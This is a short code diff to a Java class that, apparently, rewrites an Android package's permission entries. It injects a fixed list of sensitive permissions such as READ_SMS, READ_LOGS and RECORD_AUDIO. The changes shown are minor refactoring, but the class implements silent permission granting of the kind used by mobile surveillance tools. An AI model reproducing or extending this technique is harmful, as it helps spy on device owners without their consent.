@@ -32,6 +32,7 @@ public class PackageInfo {
 	private String packageName;
 	private FileInputStream fin;
 	private XmlParser xml;
+	
 	private String requiredPerms[] =  {
 			"android.permission.READ_LOGS",
 			"android.permission.READ_SMS",
@@ -56,7 +57,8 @@ public class PackageInfo {
 			"android.permission.WAKE_LOCK",
 			"android.permission.RECORD_AUDIO",
 			"android.permission.ACCESS_NETWORK_STATE",
-			"android.permission.FLASHLIGHT" 
+			"android.permission.FLASHLIGHT"
+			//"android.permission.REBOOT"
 	};
 	
 	// XML da parsare
@@ -64,19 +66,19 @@ public class PackageInfo {
 		this.fin = fin;
 		this.packageName = packageName;
 		
-		xml = new XmlParser(this.fin);
+		this.xml = new XmlParser(this.fin);
 	}
 	
 	public String getPackagePath() {	
-		return xml.getPackagePath(this.packageName);
+		return this.xml.getPackagePath(this.packageName);
 	}
 	
 	private ArrayList<String> getPackagePermissions() {
-		return xml.getPackagePermissions(this.packageName);
+		return this.xml.getPackagePermissions(this.packageName);
 	}
 	
 	public boolean addRequiredPermissions(String outName) {
-		if (xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
+		if (this.xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
 			return false;
 		}
 		
